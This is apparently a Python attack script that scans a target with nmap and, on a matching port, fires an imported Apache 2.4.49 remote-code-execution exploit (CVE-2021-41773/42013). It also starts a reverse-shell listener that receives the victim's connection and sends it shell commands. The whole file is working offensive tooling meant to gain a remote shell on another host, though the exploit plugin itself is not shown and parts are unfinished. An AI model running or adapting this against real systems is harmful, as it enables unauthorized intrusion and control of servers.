import argparse
import socket
from time import sleep
import recon
import socket
from multiprocessing import Process
import plugins.initial_access.plugin_initial_access_apache2_4_49_RCE as plugin_initial_access_apache2_4_49_RCE


def listener():
    s = socket.socket()
    s.bind((LOCAL_ADDRESS, LOCAL_PORT))
    print('[+] Listening on {}:{}'.format(LOCAL_ADDRESS, LOCAL_PORT))
    s.listen()
    client_socket, client_address = s.accept()
    print('[+] {}:{} connected'.format(client_address[0], client_address[1]))
    # receiving the current working directory of the client
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print("[+] Current working directory:", cwd)

    while True:
        # get the command from prompt
        pwd = "{} $> ".format(cwd)
        print(pwd, end='')
        command = 'echo $PATH > /tmp/toto'
        
        #if not command.strip():
            # empty command
            #continue
        # send the command to the client
        client_socket.send(command.encode())
        #if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            #break
        # retrieve command results
        output = client_socket.recv(BUFFER_SIZE).decode()
        # split command output and current directory
        #results, cwd = output.split(SEPARATOR)
        # print output
        print(output)

def exploit():
    sleep(3)
    try:
        print('[+] Running exploit')
        res = plugin_initial_access_apache2_4_49_RCE.exploit(args.target_ip, i['port'], LOCAL_ADDRESS, LOCAL_PORT)
        if res is True:
            print('[+] Exploit was successful !')
    except Exception as e:
        print(e)

def extract_ip():
    st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:       
        st.connect(('10.255.255.255', 1))
        IP = st.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        st.close()
    return IP

if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('-t', '--target_ip', type=str, help='ip to target', required=True)
    args = parser.parse_args()
    res_recon = recon.nmap_scan(args.target_ip)

    LOCAL_ADDRESS = extract_ip()
    LOCAL_PORT = 9001
    BUFFER_SIZE = 1024 * 128
    SEPARATOR = '<sep>'

    for i in res_recon:
        print('[+] Attacking port {}'.format(i['port']))
        if i['port'] == '4444':
            print('[+] Attempting to gain access with CVE-2021-41773 or CVE-2021-42013...')
            listener_process = Process(target=listener)
            listener_process.start()
            exploit_process = Process(target=exploit)
            exploit_process.start()
            listener_process.join()
            exploit_process.join()
        else:
            print('[-] No exploit available for this port')